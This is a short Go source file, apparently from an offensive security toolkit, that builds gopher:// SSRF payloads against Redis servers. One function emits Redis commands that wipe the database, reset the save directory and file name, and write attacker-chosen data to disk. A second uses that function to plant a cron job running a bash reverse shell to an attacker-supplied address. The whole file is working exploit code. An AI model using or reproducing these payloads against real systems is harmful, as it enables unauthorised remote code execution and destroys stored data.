package gopher

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/virink/virzz/common"
	"github.com/virink/virzz/utils"
)

// ExpRedisCmd -
func ExpRedisCmd(addr, path, name, data string) (string, error) {
	common.Logger.Debug("path: ", path)
	common.Logger.Debug("name: ", name)
	common.Logger.Debug("data: ", data)
	ps := []string{
		"*1", "$8", "flushall",
		"*3", "$3", "set", "$1", "1", fmt.Sprintf("$%d", len(data)), data,
		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
		"*1", "$4", "save",
		"*1", "$4", "quit",
		"",
	}
	p := url.QueryEscape(strings.Join(ps, "\r\n"))
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
}

// ExpRedisReverseShell -
func ExpRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
	ip, port, err := utils.ParseAddr(reverseAddr)
	if err != nil {
		return "", err
	}
	cmd := fmt.Sprintf("\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n", ip, port)
	return ExpRedisCmd(addr, path, name, cmd)
}
